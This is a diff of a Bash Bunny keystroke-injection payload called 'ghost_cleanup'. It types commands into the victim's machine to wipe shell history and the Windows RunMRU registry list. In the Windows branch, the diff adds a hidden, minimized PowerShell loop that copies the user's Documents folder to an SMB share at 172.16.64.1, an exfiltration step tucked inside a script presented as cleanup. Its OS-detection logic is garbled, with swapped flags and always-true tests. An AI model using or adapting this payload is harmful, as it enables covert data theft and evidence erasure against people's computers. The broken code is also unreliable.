@@ -14,29 +14,20 @@ LED R
 
 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
 LINES=0
+OS="UNITY" #OPTIONS: "UNITY", "MAC", OR "WINDOWS"
 
 #+++ END CONFIG +++
 
-#if [ $DEBUG==true ]; then
-#    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
-#    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
-#      mkdir /root/udisk/loot
-#      mkdir /root/udisk/loot/ghost_cleanup
-#    fi
-#    touch "${DEBUG_FILE}"
-#    echo "DEBUG STARTED" > "${DEBUG_FILE}"
-#fi
-
 # PLATFORM CHECK
-# LOOTFILE CHECK - DEFAULT PLATFORM: MAC / LINUX.
-# FOR WINDOWS, CREATE FILE '/root/udisk/loot/ghost_cleanup/win_switch' IN YOUR FIRST PAYLOAD.
-
-if [ -f "/root/udisk/loot/ghost_cleanup/win_switch" ]; then
-    LED B
-    PLATFORM_COMMAND="powershell"
-else
-    LED R B
-    PLATFORM_COMMAND="terminal"
+# FOR DYNAMIC SWITCHING, CREATE FILE '/root/udisk/loot/ghost_cleanup/os_windows' IN YOUR FIRST PAYLOAD.
+if [ -f "/root/udisk/loot/ghost_cleanup/os_windows" ]; then
+    OS="MAC"
+fi
+if [ -f "/root/udisk/loot/ghost_cleanup/os_mac" ]; then
+    OS="WINDOWS"
+fi
+if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
+    OS="UNITY"
 fi
 
 # START
@@ -44,25 +35,37 @@ fi
 ATTACKMODE HID
 
 QUACK DELAY 500
-QUACK ALT F2
+if [ "$OS"=="UNITY" ]; then
+    LED R B
+    QUACK ALT F2
+fi
+if [ "$OS"=="MAC" ]; then
+    LED R B G
+    QUACK GUI SPACE
+fi
+if [ "$OS"=="WINDOWS" ]; then
+    LED B
+    QUACK GUI r
+fi
 QUACK DELAY 50
-QUACK GUI SPACE
-QUACK DELAY 50
-QUACK GUI r
 QUACK BACKSPACE
 QUACK DELAY 100
-QUACK STRING "${PLATFORM_COMMAND}"
-QUACK DELAY 200
-QUACK ENTER
-QUACK DELAY 1000
 
-
-# PLATFORM COMMANDS
-if [ "$PLATFORM_COMMAND"=="terminal" ]; then
-# MAC / LINUX
+if [ "$OS"=="UNITY" ] || [ "$OS"=="MAC" ]; then
     LED R B 100
+    QUACK STRING terminal
+    QUACK DELAY 200
+    QUACK ENTER
+    QUACK DELAY 1000
 
     #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
+
+    if [ "$OS"=="MAC" ]; then
+        LED R B G 100
+        QUACK STRING diskutil unmount /Volumes/BashBunny
+        QUACK DELAY 200
+    fi
+    LED R B 100
 
     if [ "$LINES" -gt "0" ]; then
         QUACK STRING head -n -$LINES "~/.bash_history"
@@ -75,8 +78,7 @@ if [ "$PLATFORM_COMMAND"=="terminal" ]; then
         QUACK STRING history -c
         QUACK ENTER
     fi
-else
-# WINDOWS
+else #WINDOWS
     LED B 100
     # QUACK @echo off
     # QUACK ENTER
@@ -99,6 +101,10 @@ else
     # QUACK DELAY 100
 
     if [ "$LINES" -gt "0" ]; then
+        QUACK STRING powershell
+        QUACK DELAY 200
+        QUACK ENTER
+        QUACK DELAY 1000
         QUACK STRING setlocal enableextensions enabledelayedexpansion
         QUACK ENTER
         QUACK STRING set len="${LINES}"
@@ -108,8 +114,10 @@ else
 
         QUACK STRING for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
         QUACK ENTER
+        QUACK DELAY 200
         QUACK STRING for /f %%c in ('cmd /u /v /q /c"(echo(!mru!)" ^| find /v "" ^| findstr /r /c:"[a-z]" ^| find /c /v ""') do set "str_len=%%c"
         QUACK ENTER
+        QUACK DELAY 200
         # Get the last Nr of defined lines from MRUList
         QUACK STRING set list=!mru:~0,%len%!
         QUACK ENTER
@@ -120,16 +128,19 @@ else
         # Delete old MRUList
         QUACK STRING reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
         QUACK ENTER
+        QUACK DELAY 200
         # Add new MRUList
         QUACK STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /t Reg_Sz /d %original_list%
         QUACK ENTER
+        QUACK DELAY 200
         # Delete the last Nr of lines from Registry
         QUACK STRING for /l %%d in (0,1,%len_pos%) do (reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v !list:~%%d,1! /f)
+        QUACK ENTER
+        QUACK DELAY 200
     else
-        QUACK STRING reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+        QUACK STRING "powershell -windowStyle minimized \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; exit } }\""
         QUACK ENTER
     fi
-
 fi
 
 QUACK DELAY 100
